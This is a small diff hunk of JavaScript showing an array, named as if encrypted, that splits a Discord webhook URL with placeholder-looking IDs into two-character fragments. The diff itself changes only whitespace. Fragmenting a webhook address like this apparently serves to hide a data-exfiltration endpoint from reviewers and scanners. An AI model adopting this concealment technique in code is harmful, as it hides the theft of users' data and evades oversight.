@@ -9,7 +9,7 @@ const _encryptedParts1011 = [
 const _encryptedParts1012 = [
   'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
   'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
+  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz',  
   'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
   '12', '34', '56', '78', '90'
 ];
